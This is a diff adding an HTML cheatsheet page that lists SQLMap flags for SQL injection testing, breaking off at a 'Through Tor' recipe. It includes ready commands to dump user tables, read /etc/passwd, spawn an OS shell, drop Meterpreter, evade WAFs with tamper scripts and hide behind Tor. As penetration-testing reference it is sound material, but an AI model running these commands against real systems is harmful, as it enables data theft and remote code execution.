@@ -1,0 +1,1119 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Cheatsheet · ArxOS cheatsheets</title><link rel="stylesheet" href="../../../../../codex.css"></head>
+<body><header class="cx-top"><a class="cx-brand" href="../../../../../index.html">ArxOS</a><span class="cx-sub">Cheatsheets</span>
+<a class="cx-search-link" href="../../../../../index.html#search">Search</a></header>
+<main class="cx-main"><nav class="cx-crumbs"><a href="../../../../../index.html">Cheatsheets</a> › Web › SQL Injection</nav><h1>Cheatsheet</h1><p class="cx-lede">Every operator-relevant SQLMap flag in one place, organized by phase - target spec, detection, technique, enumeration, file ops, OS exec, bypass, output, session. Designed for instant lookup, not learning.</p><div class="cx-tags"><span class="cx-tag">MITRE T1190</span></div><article class="cx-body"><h2 id="tldr">TL;DR</h2>
+<p>A flag-organized reference. Each table is one logical phase; each row is one flag with its purpose. When in doubt about a flag, this page first; the topic pages (linked at the top of each section) for context.</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code># A complete operator workflow in shorthand
+sqlmap -r req.txt --batch                                                    # spec the target
+sqlmap -r req.txt --batch --level=5 --risk=3 --tamper=between,space2comment  # detect with bypass
+sqlmap -r req.txt --batch --dbs                                              # enumerate
+sqlmap -r req.txt --batch -D prod -T users --dump                            # exfiltrate
+sqlmap -r req.txt --batch --is-dba --file-read=/etc/passwd                   # post-exploit
+sqlmap -r req.txt --batch --os-shell --technique=E                           # RCE</code></pre></figure>
+<p>Success indicator: a working session that progresses cleanly through these phases without you opening the SQLMap help twice.</p>
+<h2 id="target-specification">Target specification</h2>
+<p>See <a href="../index.html#pointing-sqlmap-at-a-target">SQLMap overview</a>.</p>
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>-u URL</code></td>
+<td>Target URL (with GET params inline)</td>
+</tr>
+<tr>
+<td><code>--url URL</code></td>
+<td>Same as <code>-u</code></td>
+</tr>
+<tr>
+<td><code>-r FILE</code></td>
+<td>Use Burp-captured HTTP request file</td>
+</tr>
+<tr>
+<td><code>--data STRING</code></td>
+<td>POST body (form-data, JSON, XML, whatever)</td>
+</tr>
+<tr>
+<td><code>--method M</code></td>
+<td>Override HTTP method (PUT, DELETE, PATCH, etc.)</td>
+</tr>
+<tr>
+<td><code>-p PARAM</code></td>
+<td>Restrict testing to a specific parameter</td>
+</tr>
+<tr>
+<td><code>--skip PARAM</code></td>
+<td>Skip testing this parameter</td>
+</tr>
+<tr>
+<td><code>*</code> (in URL/data)</td>
+<td>Injection marker - restrict testing to this exact spot</td>
+</tr>
+<tr>
+<td><code>--param-del CHAR</code></td>
+<td>Parameter delimiter (default <code>&amp;</code>, sometimes <code>;</code>)</td>
+</tr>
+<tr>
+<td><code>--param-exclude REGEX</code></td>
+<td>Skip parameters matching this regex</td>
+</tr>
+<tr>
+<td><code>--randomize PARAM</code></td>
+<td>Randomize this parameter's value on every request</td>
+</tr>
+<tr>
+<td><code>--eval CODE</code></td>
+<td>Python code to compute parameter values pre-request</td>
+</tr>
+<tr>
+<td><code>--batch</code></td>
+<td>Auto-accept all interactive prompts with defaults</td>
+</tr>
+<tr>
+<td><code>--crawl=N</code></td>
+<td>Crawl the site to depth N, test forms found</td>
+</tr>
+<tr>
+<td><code>--forms</code></td>
+<td>Parse and test forms on the target URL</td>
+</tr>
+<tr>
+<td><code>-g GOOGLE_DORK</code></td>
+<td>Test all URLs from Google search results</td>
+</tr>
+<tr>
+<td><code>-m FILE</code></td>
+<td>Test multiple targets from a list file</td>
+</tr>
+</tbody>
+</table>
+<h3 id="headers-cookies-auth">Headers, cookies, auth</h3>
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>-H 'Name: value'</code></td>
+<td>Add a custom header (repeatable)</td>
+</tr>
+<tr>
+<td><code>--headers="H1\nH2"</code></td>
+<td>Multiple headers in one flag</td>
+</tr>
+<tr>
+<td><code>--cookie="k=v; k2=v2"</code></td>
+<td>Cookie header</td>
+</tr>
+<tr>
+<td><code>--cookie-del CHAR</code></td>
+<td>Cookie value separator (default <code>;</code>)</td>
+</tr>
+<tr>
+<td><code>--load-cookies FILE</code></td>
+<td>Load Netscape/Mozilla-format cookies file</td>
+</tr>
+<tr>
+<td><code>--drop-set-cookie</code></td>
+<td>Ignore <code>Set-Cookie</code> in responses</td>
+</tr>
+<tr>
+<td><code>-A USER_AGENT</code></td>
+<td>Set User-Agent</td>
+</tr>
+<tr>
+<td><code>--user-agent UA</code></td>
+<td>Same as <code>-A</code></td>
+</tr>
+<tr>
+<td><code>--random-agent</code></td>
+<td>Random UA per scan (from built-in pool)</td>
+</tr>
+<tr>
+<td><code>--mobile</code></td>
+<td>Use a mobile-browser UA</td>
+</tr>
+<tr>
+<td><code>--host HOST</code></td>
+<td>Set Host header</td>
+</tr>
+<tr>
+<td><code>--referer URL</code></td>
+<td>Set Referer header</td>
+</tr>
+<tr>
+<td><code>--auth-type TYPE</code></td>
+<td>HTTP auth type (Basic, Digest, NTLM, PKI)</td>
+</tr>
+<tr>
+<td><code>--auth-cred user:pass</code></td>
+<td>HTTP auth credentials</td>
+</tr>
+<tr>
+<td><code>--auth-file FILE</code></td>
+<td>PEM cert for client-cert auth</td>
+</tr>
+</tbody>
+</table>
+<h2 id="connection">Connection</h2>
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>--proxy=URL</code></td>
+<td>Route through proxy (Burp = <code>http://127.0.0.1:8080</code>)</td>
+</tr>
+<tr>
+<td><code>--proxy-cred=user:pass</code></td>
+<td>Proxy credentials</td>
+</tr>
+<tr>
+<td><code>--proxy-file=FILE</code></td>
+<td>List of proxies, rotate through them</td>
+</tr>
+<tr>
+<td><code>--tor</code></td>
+<td>Use local Tor SOCKS proxy</td>
+</tr>
+<tr>
+<td><code>--tor-port=N</code></td>
+<td>Tor port if non-default</td>
+</tr>
+<tr>
+<td><code>--tor-type=SOCKS5</code></td>
+<td>Tor proxy type (default SOCKS5)</td>
+</tr>
+<tr>
+<td><code>--check-tor</code></td>
+<td>Verify Tor actually anonymizes</td>
+</tr>
+<tr>
+<td><code>--force-ssl</code></td>
+<td>Force HTTPS to target</td>
+</tr>
+<tr>
+<td><code>--ignore-proxy</code></td>
+<td>Ignore $HTTP_PROXY env var</td>
+</tr>
+<tr>
+<td><code>--ignore-redirects</code></td>
+<td>Don't follow redirects</td>
+</tr>
+<tr>
+<td><code>--ignore-timeouts</code></td>
+<td>Treat timeouts as non-errors</td>
+</tr>
+<tr>
+<td><code>--delay=N</code></td>
+<td>Seconds between requests</td>
+</tr>
+<tr>
+<td><code>--timeout=N</code></td>
+<td>Per-request timeout</td>
+</tr>
+<tr>
+<td><code>--retries=N</code></td>
+<td>Retries per failing request (default 3)</td>
+</tr>
+<tr>
+<td><code>--keep-alive</code></td>
+<td>HTTP keep-alive</td>
+</tr>
+<tr>
+<td><code>--null-connection</code></td>
+<td>Use HEAD requests where possible for speed</td>
+</tr>
+<tr>
+<td><code>--threads=N</code></td>
+<td>Parallel requests (max 10)</td>
+</tr>
+</tbody>
+</table>
+<h2 id="detection">Detection</h2>
+<p>See <a href="../index.html#tuning-the-detection-when-the-defaults-miss">SQLMap overview: tuning</a> and <a href="../../detection/index.html">SQLi detection</a>.</p>
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>--level=1..5</code></td>
+<td>Test depth (default 1; 5 = all 7,800 payloads)</td>
+</tr>
+<tr>
+<td><code>--risk=1..3</code></td>
+<td>Risk tolerance (default 1; 3 = includes OR-based that may modify data)</td>
+</tr>
+<tr>
+<td><code>--prefix=STR</code></td>
+<td>Prepend STR to every payload</td>
+</tr>
+<tr>
+<td><code>--suffix=STR</code></td>
+<td>Append STR to every payload</td>
+</tr>
+<tr>
+<td><code>--dbms=NAME</code></td>
+<td>Skip DBMS fingerprint, force this DBMS</td>
+</tr>
+<tr>
+<td><code>--dbms-cred=user:pass</code></td>
+<td>DBMS credentials (for <code>--passwords</code> against specific user)</td>
+</tr>
+<tr>
+<td><code>--os=NAME</code></td>
+<td>Force OS (Linux, Windows)</td>
+</tr>
+<tr>
+<td><code>--invalid-bignum</code></td>
+<td>Use big numbers to invalidate (instead of negation)</td>
+</tr>
+<tr>
+<td><code>--invalid-logical</code></td>
+<td>Use logical ops to invalidate</td>
+</tr>
+<tr>
+<td><code>--invalid-string</code></td>
+<td>Use random strings to invalidate</td>
+</tr>
+<tr>
+<td><code>--no-cast</code></td>
+<td>Skip CAST() wrapper on extraction</td>
+</tr>
+<tr>
+<td><code>--no-escape</code></td>
+<td>Skip string escape in payloads</td>
+</tr>
+<tr>
+<td><code>--skip-static</code></td>
+<td>Test even parameters classified as static</td>
+</tr>
+<tr>
+<td><code>--skip-heuristics</code></td>
+<td>Skip heuristic detection</td>
+</tr>
+<tr>
+<td><code>--skip-urlencode</code></td>
+<td>Don't URL-encode payloads</td>
+</tr>
+<tr>
+<td><code>--skip-waf</code></td>
+<td>Skip WAF/IPS detection heuristic</td>
+</tr>
+<tr>
+<td><code>--time-sec=N</code></td>
+<td>SLEEP seconds for time-based blind (default 5)</td>
+</tr>
+<tr>
+<td><code>--union-cols=N</code></td>
+<td>Force UNION column count</td>
+</tr>
+<tr>
+<td><code>--union-char=CHAR</code></td>
+<td>UNION fill character (default NULL + random ints)</td>
+</tr>
+<tr>
+<td><code>--union-from=TABLE</code></td>
+<td>Append <code>FROM TABLE</code> to UNION (Oracle, etc.)</td>
+</tr>
+<tr>
+<td><code>--second-url=URL</code></td>
+<td>Second-order URL to fetch after each payload</td>
+</tr>
+<tr>
+<td><code>--second-req=FILE</code></td>
+<td>Second-order request file</td>
+</tr>
+</tbody>
+</table>
+<h3 id="response-differential">Response differential</h3>
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>--string=TEXT</code></td>
+<td>TRUE responses contain TEXT</td>
+</tr>
+<tr>
+<td><code>--not-string=TEXT</code></td>
+<td>FALSE responses contain TEXT</td>
+</tr>
+<tr>
+<td><code>--regexp=PATTERN</code></td>
+<td>TRUE responses match regex</td>
+</tr>
+<tr>
+<td><code>--code=N</code></td>
+<td>TRUE responses return HTTP code N</td>
+</tr>
+<tr>
+<td><code>--titles</code></td>
+<td>Compare <code>&lt;title&gt;</code> rather than full body</td>
+</tr>
+<tr>
+<td><code>--text-only</code></td>
+<td>Strip HTML before comparison</td>
+</tr>
+<tr>
+<td><code>--parse-errors</code></td>
+<td>Print parsed DBMS errors</td>
+</tr>
+<tr>
+<td><code>--repair</code></td>
+<td>Re-run failed extractions on detection</td>
+</tr>
+</tbody>
+</table>
+<h2 id="technique-selection">Technique selection</h2>
+<p>See the BEUSTQ technique matrix in <a href="../index.html">SQLMap overview</a>.</p>
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Effect</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>--technique=B</code></td>
+<td>Only boolean-based blind</td>
+</tr>
+<tr>
+<td><code>--technique=E</code></td>
+<td>Only error-based</td>
+</tr>
+<tr>
+<td><code>--technique=U</code></td>
+<td>Only UNION-based</td>
+</tr>
+<tr>
+<td><code>--technique=S</code></td>
+<td>Only stacked queries</td>
+</tr>
+<tr>
+<td><code>--technique=T</code></td>
+<td>Only time-based blind</td>
+</tr>
+<tr>
+<td><code>--technique=Q</code></td>
+<td>Only inline queries</td>
+</tr>
+<tr>
+<td><code>--technique=BEU</code></td>
+<td>Any subset (combine letters; default is <code>BEUSTQ</code>)</td>
+</tr>
+<tr>
+<td><code>--dns-domain=DOMAIN</code></td>
+<td>Enable out-of-band DNS exfil (you control DOMAIN's DNS)</td>
+</tr>
+</tbody>
+</table>
+<h2 id="enumeration">Enumeration</h2>
+<p>See <a href="../../enumeration/index.html">Enumeration</a>.</p>
+<h3 id="recon">Recon</h3>
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>What it returns</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>--banner</code></td>
+<td>DBMS version banner</td>
+</tr>
+<tr>
+<td><code>--current-user</code></td>
+<td>DB connection user</td>
+</tr>
+<tr>
+<td><code>--current-db</code></td>
+<td>Current database name</td>
+</tr>
+<tr>
+<td><code>--hostname</code></td>
+<td>DB server hostname</td>
+</tr>
+<tr>
+<td><code>--is-dba</code></td>
+<td>Whether current user has DBA rights</td>
+</tr>
+<tr>
+<td><code>--users</code></td>
+<td>List all DB users</td>
+</tr>
+<tr>
+<td><code>--passwords</code></td>
+<td>DB user password hashes (DBA usually required)</td>
+</tr>
+<tr>
+<td><code>--privileges</code></td>
+<td>Per-user privileges</td>
+</tr>
+<tr>
+<td><code>--roles</code></td>
+<td>Per-user roles (Oracle/MSSQL)</td>
+</tr>
+<tr>
+<td><code>--statements</code></td>
+<td>List currently-executing SQL (live)</td>
+</tr>
+</tbody>
+</table>
+<h3 id="schema-enumeration">Schema enumeration</h3>
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>What it returns</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>--dbs</code></td>
+<td>All databases (schemas)</td>
+</tr>
+<tr>
+<td><code>--tables</code></td>
+<td>Tables in current DB (or in DB specified with <code>-D</code>)</td>
+</tr>
+<tr>
+<td><code>--columns</code></td>
+<td>Columns in current table (or <code>-T</code>)</td>
+</tr>
+<tr>
+<td><code>--schema</code></td>
+<td>Full schema overview (all DBs, tables, columns)</td>
+</tr>
+<tr>
+<td><code>--count</code></td>
+<td>Row counts per table</td>
+</tr>
+<tr>
+<td><code>--comments</code></td>
+<td>Include SQL comments in output</td>
+</tr>
+<tr>
+<td><code>--search</code></td>
+<td>Search across schema by keyword</td>
+</tr>
+<tr>
+<td><code>-D DB</code></td>
+<td>Restrict to database DB</td>
+</tr>
+<tr>
+<td><code>-T TABLE</code></td>
+<td>Restrict to table TABLE</td>
+</tr>
+<tr>
+<td><code>-C COL,COL2</code></td>
+<td>Restrict to columns</td>
+</tr>
+<tr>
+<td><code>--exclude-sysdbs</code></td>
+<td>Skip system DBs (mysql, sys, information_schema, etc.)</td>
+</tr>
+</tbody>
+</table>
+<h3 id="data-extraction">Data extraction</h3>
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>What it does</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>--dump</code></td>
+<td>Dump entries from selected table/columns</td>
+</tr>
+<tr>
+<td><code>--dump-all</code></td>
+<td>Dump every accessible table from every accessible DB</td>
+</tr>
+<tr>
+<td><code>--where="COND"</code></td>
+<td>WHERE clause filter for <code>--dump</code></td>
+</tr>
+<tr>
+<td><code>--start=N</code></td>
+<td>First row to extract</td>
+</tr>
+<tr>
+<td><code>--stop=N</code></td>
+<td>Last row to extract</td>
+</tr>
+<tr>
+<td><code>--first=N</code></td>
+<td>First character of value to extract (blind)</td>
+</tr>
+<tr>
+<td><code>--last=N</code></td>
+<td>Last character of value to extract (blind)</td>
+</tr>
+<tr>
+<td><code>--dump-format=FMT</code></td>
+<td>Output format: CSV (default), HTML, SQLITE</td>
+</tr>
+<tr>
+<td><code>--sql-query=Q</code></td>
+<td>Run a literal SQL query</td>
+</tr>
+<tr>
+<td><code>--sql-shell</code></td>
+<td>Interactive SQL prompt</td>
+</tr>
+<tr>
+<td><code>--sql-file=F</code></td>
+<td>Run SQL from file</td>
+</tr>
+</tbody>
+</table>
+<h3 id="hash-cracking">Hash cracking</h3>
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>What it does</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>(Interactive prompt when hashes are detected)</td>
+<td>Offer to crack in-process</td>
+</tr>
+<tr>
+<td>(Built-in wordlist)</td>
+<td><code>/usr/share/sqlmap/data/txt/wordlist.tx_</code> (~1.4M entries)</td>
+</tr>
+</tbody>
+</table>
+<p>The cracking happens inline during <code>--dump</code> or <code>--passwords</code> when SQLMap recognizes a hash format. To opt out non-interactively: <code>--batch</code> accepts all prompts including "do you want to crack" → yes.</p>
+<h2 id="file-operations">File operations</h2>
+<p>See <a href="../../file-operations/index.html">File operations</a>.</p>
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>--file-read=PATH</code></td>
+<td>Read file from DB host</td>
+</tr>
+<tr>
+<td><code>--file-write=LOCAL</code></td>
+<td>Local file to write to DB host</td>
+</tr>
+<tr>
+<td><code>--file-dest=REMOTE_PATH</code></td>
+<td>Where to write on DB host</td>
+</tr>
+</tbody>
+</table>
+<h2 id="os-command-execution">OS command execution</h2>
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>--os-shell</code></td>
+<td>Interactive OS shell on DB host</td>
+</tr>
+<tr>
+<td><code>--os-cmd=CMD</code></td>
+<td>One-shot OS command</td>
+</tr>
+<tr>
+<td><code>--os-pwn</code></td>
+<td>Drop a Meterpreter session via msfvenom</td>
+</tr>
+<tr>
+<td><code>--os-smbrelay</code></td>
+<td>SMB relay attack (MSSQL with <code>xp_dirtree</code> + Responder)</td>
+</tr>
+<tr>
+<td><code>--os-bof</code></td>
+<td>Buffer overflow exploit for MSSQL <code>sp_replwritetovarbin</code></td>
+</tr>
+<tr>
+<td><code>--reg-read</code></td>
+<td>Read Windows registry key (MSSQL)</td>
+</tr>
+<tr>
+<td><code>--reg-add</code></td>
+<td>Write Windows registry key</td>
+</tr>
+<tr>
+<td><code>--reg-del</code></td>
+<td>Delete Windows registry key</td>
+</tr>
+<tr>
+<td><code>--reg-key=PATH</code></td>
+<td>Registry key path</td>
+</tr>
+<tr>
+<td><code>--reg-value=NAME</code></td>
+<td>Registry value name</td>
+</tr>
+<tr>
+<td><code>--reg-data=DATA</code></td>
+<td>Registry value data</td>
+</tr>
+<tr>
+<td><code>--reg-type=TYPE</code></td>
+<td>Registry value type (REG_SZ, REG_DWORD, etc.)</td>
+</tr>
+</tbody>
+</table>
+<h3 id="msf-integration">MSF integration</h3>
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>--msf-path=PATH</code></td>
+<td>Path to Metasploit framework</td>
+</tr>
+<tr>
+<td><code>--tmp-path=PATH</code></td>
+<td>Remote tempdir for staging</td>
+</tr>
+</tbody>
+</table>
+<h2 id="waf-ips-bypass">WAF / IPS bypass</h2>
+<p>See <a href="../../bypasses/index.html">Filter &amp; WAF bypasses</a>.</p>
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>--random-agent</code></td>
+<td>Random real-browser UA</td>
+</tr>
+<tr>
+<td><code>--mobile</code></td>
+<td>Mobile UA</td>
+</tr>
+<tr>
+<td><code>--tamper=SCRIPT[,SCRIPT2,...]</code></td>
+<td>Apply tamper scripts to payloads (see list below)</td>
+</tr>
+<tr>
+<td><code>--list-tampers</code></td>
+<td>Print all available tamper scripts</td>
+</tr>
+<tr>
+<td><code>--chunked</code></td>
+<td>Send POST body as HTTP chunked transfer</td>
+</tr>
+<tr>
+<td><code>--hpp</code></td>
+<td>HTTP Parameter Pollution mode</td>
+</tr>
+<tr>
+<td><code>--csrf-token=NAME</code></td>
+<td>Auto-refresh CSRF token param</td>
+</tr>
+<tr>
+<td><code>--csrf-url=URL</code></td>
+<td>Fetch CSRF token from this URL</td>
+</tr>
+<tr>
+<td><code>--csrf-method=METHOD</code></td>
+<td>Method for CSRF token URL</td>
+</tr>
+<tr>
+<td><code>--csrf-data=DATA</code></td>
+<td>Data for CSRF token URL (if POST)</td>
+</tr>
+<tr>
+<td><code>--csrf-retries=N</code></td>
+<td>CSRF retries</td>
+</tr>
+<tr>
+<td><code>--safe-url=URL</code></td>
+<td>"Safe" URL to keep session alive</td>
+</tr>
+<tr>
+<td><code>--safe-post=DATA</code></td>
+<td>POST body for safe URL</td>
+</tr>
+<tr>
+<td><code>--safe-req=FILE</code></td>
+<td>Request file for safe URL</td>
+</tr>
+<tr>
+<td><code>--safe-freq=N</code></td>
+<td>Hit safe URL every N requests</td>
+</tr>
+<tr>
+<td><code>--randomize=PARAM</code></td>
+<td>Randomize parameter value per request</td>
+</tr>
+<tr>
+<td><code>--eval=CODE</code></td>
+<td>Python pre-request code</td>
+</tr>
+</tbody>
+</table>
+<h3 id="common-tamper-scripts">Common tamper scripts</h3>
+<table>
+<thead>
+<tr>
+<th>Tamper</th>
+<th>Effect</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>between</code></td>
+<td><code>&gt;</code> → <code>NOT BETWEEN 0 AND #</code>; <code>=</code> → <code>BETWEEN # AND #</code></td>
+</tr>
+<tr>
+<td><code>space2comment</code></td>
+<td>space → <code>/**/</code></td>
+</tr>
+<tr>
+<td><code>space2dash</code></td>
+<td>space → <code>-- \n</code> + random string</td>
+</tr>
+<tr>
+<td><code>space2hash</code></td>
+<td>space → <code>#\n</code> + random string (MySQL)</td>
+</tr>
+<tr>
+<td><code>space2plus</code></td>
+<td>space → <code>+</code></td>
+</tr>
+<tr>
+<td><code>space2randomblank</code></td>
+<td>space → random whitespace char</td>
+</tr>
+<tr>
+<td><code>randomcase</code></td>
+<td>random-case keywords (<code>SELECT</code> → <code>SeLeCt</code>)</td>
+</tr>
+<tr>
+<td><code>equaltolike</code></td>
+<td><code>=</code> → <code>LIKE</code></td>
+</tr>
+<tr>
+<td><code>0eunion</code></td>
+<td><code>UNION</code> → <code>e0UNION</code></td>
+</tr>
+<tr>
+<td><code>base64encode</code></td>
+<td>base64 the whole payload</td>
+</tr>
+<tr>
+<td><code>charencode</code></td>
+<td>URL-encode every char</td>
+</tr>
+<tr>
+<td><code>charunicodeencode</code></td>
+<td>Unicode-encode every char</td>
+</tr>
+<tr>
+<td><code>commalesslimit</code></td>
+<td><code>LIMIT M,N</code> → <code>LIMIT N OFFSET M</code> (MySQL)</td>
+</tr>
+<tr>
+<td><code>apostrophenullencode</code></td>
+<td><code>'</code> → <code>%00%27</code></td>
+</tr>
+<tr>
+<td><code>apostrophemask</code></td>
+<td><code>'</code> → unicode look-alike</td>
+</tr>
+<tr>
+<td><code>appendnullbyte</code></td>
+<td>append <code>%00</code></td>
+</tr>
+<tr>
+<td><code>halfversionedmorekeywords</code></td>
+<td>versioned-comment prefix on keywords (MySQL)</td>
+</tr>
+<tr>
+<td><code>modsecurityversioned</code></td>
+<td>wrap query in MySQL versioned comment</td>
+</tr>
+<tr>
+<td><code>modsecurityzeroversioned</code></td>
+<td>wrap in zero-versioned comment</td>
+</tr>
+<tr>
+<td><code>percentage</code></td>
+<td><code>%</code> before each char (ASP)</td>
+</tr>
+<tr>
+<td><code>plus2concat</code></td>
+<td><code>+</code> → <code>CONCAT()</code> (MSSQL)</td>
+</tr>
+<tr>
+<td><code>plus2fnconcat</code></td>
+<td><code>+</code> → <code>{fn CONCAT()}</code> (MSSQL ODBC)</td>
+</tr>
+<tr>
+<td><code>symboliclogical</code></td>
+<td><code>AND/OR</code> → <code>&amp;&amp;/\|\|</code></td>
+</tr>
+<tr>
+<td><code>versionedkeywords</code></td>
+<td>wrap non-function keywords in MySQL versioned comment</td>
+</tr>
+<tr>
+<td><code>versionedmorekeywords</code></td>
+<td>wrap every keyword in MySQL versioned comment</td>
+</tr>
+</tbody>
+</table>
+<p>Chaining respects predefined priority. Common combinations:</p>
+<table>
+<thead>
+<tr>
+<th>Stack</th>
+<th>Use case</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>between</code></td>
+<td>First try when <code>=</code>/<code>&gt;</code> blocked</td>
+</tr>
+<tr>
+<td><code>space2comment</code></td>
+<td>First try when spaces blocked</td>
+</tr>
+<tr>
+<td><code>between,space2comment</code></td>
+<td>Generic baseline bypass</td>
+</tr>
+<tr>
+<td><code>between,randomcase,space2comment</code></td>
+<td>Slightly stronger</td>
+</tr>
+<tr>
+<td><code>modsecurityversioned</code></td>
+<td>Specifically targets ModSecurity rules</td>
+</tr>
+<tr>
+<td><code>apostrophenullencode,space2comment</code></td>
+<td>Bypasses quote + space filters</td>
+</tr>
+<tr>
+<td><code>charunicodeencode</code></td>
+<td>Catches naive char-class filters</td>
+</tr>
+</tbody>
+</table>
+<h2 id="output-and-session">Output and session</h2>
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>-v 0..6</code></td>
+<td>Verbosity (3 = payloads; 6 = full trace)</td>
+</tr>
+<tr>
+<td><code>--output-dir=PATH</code></td>
+<td>Custom location for session files</td>
+</tr>
+<tr>
+<td><code>--flush-session</code></td>
+<td>Discard cached state for this target</td>
+</tr>
+<tr>
+<td><code>--purge</code></td>
+<td>Delete entire SQLMap output directory</td>
+</tr>
+<tr>
+<td><code>--fresh-queries</code></td>
+<td>Don't reuse cached query results</td>
+</tr>
+<tr>
+<td><code>-t FILE</code></td>
+<td>Log all HTTP traffic to FILE</td>
+</tr>
+<tr>
+<td><code>--har=FILE</code></td>
+<td>Save HTTP traffic as HAR (browser dev-tools format)</td>
+</tr>
+<tr>
+<td><code>--save=FILE</code></td>
+<td>Save options to a config file</td>
+</tr>
+<tr>
+<td><code>-c FILE</code></td>
+<td>Load options from config file</td>
+</tr>
+<tr>
+<td><code>--results-file=FILE</code></td>
+<td>Write <code>-m</code> summary to FILE</td>
+</tr>
+<tr>
+<td><code>--update</code></td>
+<td>Update SQLMap itself</td>
+</tr>
+<tr>
+<td><code>--version</code></td>
+<td>Print version</td>
+</tr>
+<tr>
+<td><code>-h</code></td>
+<td>Short help</td>
+</tr>
+<tr>
+<td><code>-hh</code></td>
+<td>Full help</td>
+</tr>
+<tr>
+<td><code>--api</code></td>
+<td>Run SQLMap REST API server</td>
+</tr>
+<tr>
+<td><code>--api-server</code></td>
+<td>Same</td>
+</tr>
+<tr>
+<td><code>--api-client</code></td>
+<td>API client mode</td>
+</tr>
+</tbody>
+</table>
+<h2 id="reporting-flags">Reporting flags</h2>
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>What it gives</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>--dump-format=HTML</code></td>
+<td>Browseable HTML output of dumped tables</td>
+</tr>
+<tr>
+<td><code>--dump-format=SQLITE</code></td>
+<td>SQLite DB of dumped tables (queryable later)</td>
+</tr>
+<tr>
+<td><code>--har=FILE</code></td>
+<td>Full traffic in HAR format (open in browser dev tools)</td>
+</tr>
+<tr>
+<td>Session files at <code>~/.sqlmap/output/&lt;host&gt;/</code></td>
+<td>Persistent - include in deliverables</td>
+</tr>
+</tbody>
+</table>
+<h2 id="performance-parallelism">Performance / parallelism</h2>
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Effect</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>--threads=N</code></td>
+<td>Parallel requests (max 10)</td>
+</tr>
+<tr>
+<td><code>--predict-output</code></td>
+<td>Use prior values to skip already-known characters</td>
+</tr>
+<tr>
+<td><code>--keep-alive</code></td>
+<td>HTTP keep-alive</td>
+</tr>
+<tr>
+<td><code>--null-connection</code></td>
+<td>HEAD requests where possible (faster boolean blind)</td>
+</tr>
+<tr>
+<td><code>--no-cast</code></td>
+<td>Skip CAST() wrapper (faster, but breaks some extractions)</td>
+</tr>
+<tr>
+<td><code>--fresh-queries</code></td>
+<td>Don't reuse cached query results</td>
+</tr>
+<tr>
+<td><code>--time-sec=N</code></td>
+<td>SLEEP delay for time-based (lower = faster but more false positives)</td>
+</tr>
+</tbody>
+</table>
+<h2 id="quick-recipes">Quick recipes</h2>
+<h3 id="just-try-it">"Just try it"</h3>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">sqlmap -u &#x27;http://target/vuln.php?id=1&#x27; --batch</code></pre></figure>
+<h3 id="got-a-burp-request">"Got a Burp request"</h3>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">sqlmap -r req.txt --batch</code></pre></figure>
+<h3 id="json-api">"JSON API"</h3>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">sqlmap -u &#x27;http://target/api/items&#x27; \
+       -H &#x27;Content-Type: application/json&#x27; \
+       --data &#x27;{&quot;id&quot;:1*}&#x27; --batch</code></pre></figure>
+<h3 id="try-harder">"Try harder"</h3>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">sqlmap -r req.txt --batch --level=5 --risk=3 \
+       --tamper=between,space2comment --random-agent --dbms=MySQL</code></pre></figure>
+<h3 id="extract-one-specific-table">"Extract one specific table"</h3>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">sqlmap -r req.txt --batch -D prod -T users --dump</code></pre></figure>
+<h3 id="get-a-shell-fast">"Get a shell, fast"</h3>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">sqlmap -r req.txt --batch --is-dba           # confirm DBA first
+sqlmap -r req.txt --batch --os-shell --technique=E    # then interactive</code></pre></figure>
+<h3 id="read-a-specific-file">"Read a specific file"</h3>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">sqlmap -r req.txt --batch --file-read=/etc/passwd</code></pre></figure>
+<h3 id="through-tor">"Through Tor"</h3>
